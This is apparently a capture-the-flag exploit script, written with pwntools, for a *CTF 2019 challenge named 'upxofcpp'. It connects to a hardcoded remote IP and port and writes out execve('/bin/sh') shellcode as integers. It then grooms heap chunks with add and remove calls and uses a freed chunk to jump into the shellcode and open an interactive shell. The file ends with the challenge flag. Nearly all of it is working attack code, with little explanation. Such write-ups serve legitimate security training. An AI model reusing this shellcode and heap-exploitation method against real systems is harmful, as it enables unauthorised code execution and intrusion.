# File: exp.py
# Author: raycp
# Date: 2019-04-30
# Description: exp for upxofcpp

from pwn_debug.pwn_debug import *

pdbg=pwn_debug("./upxofcpp")

pdbg.context.terminal=['tmux', 'splitw', '-h']

pdbg.local()
pdbg.remote('34.92.121.149',10000)
pdbg.debug("2.23")

#p=pdbg.run("local")
p=pdbg.run("remote")


elf=pdbg.elf
libc=pdbg.libc



def add(idx,size,content):
    p.recvuntil("choice:")
    p.sendline("1")
    p.recvuntil("Index:")
    p.sendline(str(idx))
    p.recvuntil("Size:")
    p.sendline(str(size))
    p.recvuntil("stop:")
    for i in content:
        #print i
        if i >0x80000000:
            stri="-"+str(0x100000000-i)
        else:
            stri=str(i)
        p.sendline(stri)
    #p.sendline("-1")
def remove(idx):
    p.recvuntil("choice:")
    p.sendline("2")
    p.recvuntil("index:")
    p.sendline(str(idx))
def pwn():
   
   shellcode =""
   shellcode += "\x31\xf6\x48\xbb\x2f\x62\x69\x6e"
   shellcode += "\x2f\x2f\x73\x68\x56\x53\x54\x5f"
   shellcode += "\x6a\x3b\x58\x31\xd2\x0f\x05\x0a"
   jmp="\x90"*0x10+"\xeb\x6e\x00\x00"
   #print len(jmp)
   #print len(shellcode)
   content=[]
   for i in range(0,len(shellcode),4):
    
       content.append(u32(shellcode[i:i+4].ljust(4,'\x00')))
   #content.append(-1)
   #print len(content)
   #add(2,6,content)
   add(1,6,content)
   add(2,6,content)
   add(3,6,content)
   add(4,6,content)
   add(5,6,content)
   add(6,6,content)
   add(7,6,content)
   remove(3)
   remove(2)
   content=[]
   for i in range(0,len(jmp),4):
    
       content.append(u32(jmp[i:i+4].ljust(4,'\x00')))
   add(8,6,content+[0xffffffff])
   remove(1)
   p.recvuntil("choice:")
   p.sendline("4")
   p.recvuntil("index:")
   p.sendline("1")
   p.interactive() #get the shell

if __name__ == '__main__':
   pwn()
#*ctf{its_time_to_say_goodbye_to_ubuntu_16_04}

